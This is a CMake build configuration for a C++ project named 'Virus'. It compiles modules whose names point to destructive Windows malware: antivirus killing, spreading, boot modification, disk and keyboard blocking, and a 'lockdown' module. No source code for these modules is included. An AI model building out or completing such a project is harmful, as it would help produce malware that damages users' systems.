cmake_minimum_required(VERSION 3.10)
project(Virus)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

if(MSVC)
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} /W3")
    set(CMAKE_CXX_FLAGS_RELEASE "/O2 /MT")
    set(CMAKE_CXX_FLAGS_DEBUG "/Od /MTd")
else()
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wall")
    set(CMAKE_CXX_FLAGS_RELEASE "-O2 -static")
    set(CMAKE_CXX_FLAGS_DEBUG "-O0 -g")
endif()

set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /SUBSYSTEM:WINDOWS")

add_executable(virus
    main.cpp
    screamer.cpp
    filesystem.cpp
    keyblock.cpp
    killav.cpp
    spread.cpp
    openrand.cpp
    bootmod.cpp
    diskblock.cpp
    lockdown.cpp  # НОВЫЙ МОДУЛЬ
)

target_link_libraries(virus
    user32
    kernel32
    gdi32
    shell32
    advapi32
    shlwapi
    ole32
    oleaut32
)

target_compile_definitions(virus PRIVATE _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING)
target_compile_definitions(virus PRIVATE _CRT_SECURE_NO_WARNINGS)

if(WIN32)
    set_target_properties(virus PROPERTIES
        LINK_FLAGS "/SUBSYSTEM:WINDOWS"
    )
endif()
